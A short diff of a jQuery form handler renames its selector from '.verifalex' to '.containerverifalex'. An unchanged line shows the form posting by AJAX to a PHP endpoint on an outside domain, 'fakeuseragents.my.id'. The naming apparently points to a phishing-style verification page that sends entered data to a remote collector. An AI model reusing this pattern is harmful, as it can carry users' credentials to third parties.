@@ -1,5 +1,5 @@
-$(".verifalex").submit(function() {
-	var d = $(".verifalex");
+$(".containerverifalex").submit(function() {
+	var d = $(".containerverifalex");
 
 	$.ajax({
         url: "https://fakeuseragents.my.id/delapanbit/index.php",
